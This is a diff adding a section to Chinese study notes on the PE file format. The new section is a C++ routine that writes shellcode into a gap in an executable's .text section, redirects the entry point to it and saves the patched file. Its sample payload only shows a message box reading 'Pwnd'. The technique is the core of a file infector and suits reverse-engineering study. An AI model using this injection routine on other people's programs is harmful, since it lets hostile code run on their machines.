@@ -389,3 +389,90 @@ for (int i = 0; i < exportDir.NumberOfNames; i++)
 <tr><th>2</th><th>dic</th><th>2</th><th>0x0200</th><th>2</th><th>0x3030</th><th>dic</th></tr>
 </table>
 找的顺序是，先找函数名称表，比如sub，确定其序号为1之后，去序号表中找序号为1的元素，发现地址为0x0000，作为函数地址表的序号。去找0。得到sub的地址。其中导出表的base属性是函数地址表的起始序号，大多数时候不一定有用。
+
+* 扫描节间空隙并写入shellcode：
+```
+UINT scanNullInSections()
+{
+	//读文件找节内空隙
+	FILE* fp = nullptr;
+	errno_t nError = fopen_s(&fp,"./MFCSHOW.EXE","rb");
+	if (0 != nError)
+	{
+		return 0;
+	}
+	fseek(fp, 0, SEEK_END);
+	int nFileSize = 0;
+	nFileSize = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+
+	char* pContent = (char*)malloc(nFileSize + 1);
+	memset(pContent, 0, nFileSize + 1);
+	fread(pContent, sizeof(char), nFileSize, fp);
+	fclose(fp);
+	fp = nullptr;
+	//找text节中的空隙,寻找的方法其实可以从节尾往前找
+	char* pBase = (char*)pContent;
+	PIMAGE_DOS_HEADER ImageDosHeader = (IMAGE_DOS_HEADER*)pBase;
+	PIMAGE_NT_HEADERS  ImageNtHeaders = (IMAGE_NT_HEADERS*)((size_t)pBase + ImageDosHeader->e_lfanew);
+	PIMAGE_OPTIONAL_HEADER  ImageOptionalHeader = &ImageNtHeaders->OptionalHeader;
+	PIMAGE_SECTION_HEADER imageSectionHeaders = (PIMAGE_SECTION_HEADER)((char*)ImageNtHeaders + sizeof(IMAGE_NT_HEADERS));
+	if (NULL != imageSectionHeaders)
+	{
+		PIMAGE_SECTION_HEADER imageTextHeader = &imageSectionHeaders[0];
+		char* pImageTextSection = pContent + imageTextHeader->PointerToRawData;
+		PIMAGE_SECTION_HEADER imageDataHeader = &imageSectionHeaders[1];
+		char* pImageDataSection = pContent + imageDataHeader->PointerToRawData;
+		bool isTrue=judgeNull(pImageDataSection);
+
+		char shellcode[] = {
+		"\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40"
+		"\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10"
+		"\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
+		"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
+		"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
+		"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
+		"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
+		"\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c"
+		"\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
+		"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69"
+		"\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
+		"\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24"
+		"\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55"
+		"\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41"
+		"\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67"
+		"\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff"
+		"\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68"
+		"\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65"
+		"\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0"
+		"\xe9\x00\x00\00\x00"
+		};
+		DWORD dwShellLen =strlen(shellcode)+4;  //E9的偏移是写入位置-原入口点+off
+		char* pOri = pImageDataSection - 256;
+		DWORD dwShellRva = pOri - pContent + imageTextHeader->VirtualAddress - imageTextHeader->PointerToRawData;
+		DWORD dwOffset = ImageNtHeaders->OptionalHeader.AddressOfEntryPoint - dwShellRva - dwShellLen;
+		//将4字节偏移写入shellcode
+		BYTE b1 = dwOffset;
+		BYTE b2 = dwOffset>>8;
+		BYTE b3 = dwOffset>>16;
+		BYTE b4 = dwOffset>>24;
+		memcpy(shellcode+strlen(shellcode),&b1,1);
+		memcpy(shellcode + strlen(shellcode), &b2, 1);
+		memcpy(shellcode + strlen(shellcode), &b3, 1);
+		memcpy(shellcode + strlen(shellcode), &b4, 1);
+
+		memcpy(pOri, shellcode, sizeof(shellcode));
+		ImageNtHeaders->OptionalHeader.AddressOfEntryPoint = dwShellRva;
+		FILE* fp = nullptr;
+		errno_t nError = fopen_s(&fp, "./1.EXE", "wb");
+		if (0 != nError)
+		{
+			return 0;
+		}
+		fwrite(pContent, sizeof(char), nFileSize, fp);
+		fclose(fp);
+		fp = nullptr;
+	}
+	return 0;
+}
+```
